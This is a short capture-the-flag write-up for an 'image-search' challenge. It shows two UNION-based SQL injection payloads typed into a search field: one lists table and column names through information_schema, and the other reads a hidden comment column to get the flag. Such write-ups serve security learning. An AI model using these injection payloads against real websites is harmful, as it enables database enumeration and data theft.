# image-search

Page: `/index.php?page=searchimg`  
Difficulty: 5/10

## Description

A search field allows us to search for images on the site.

## Exploit

Good ol' SQL injection baby' *(read that with a texan accent)*.

We can use the `INFORMATION_SCHEMA` database to get metadata information about the tables:
```sql
1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
```

We learn that the `list_images` table has a `comment` column, so we can use it to fetch the comments:
```sql
1 OR 1=1 UNION SELECT comment, NULL FROM list_images
```

And there we have the flag (in md5 format, to re-hash via sha256).

## Fun fact of the day

Its the same flag as [`challenge_user-agent`](../challenge_user-agent/). Had me going crazy. Crazy? I was-
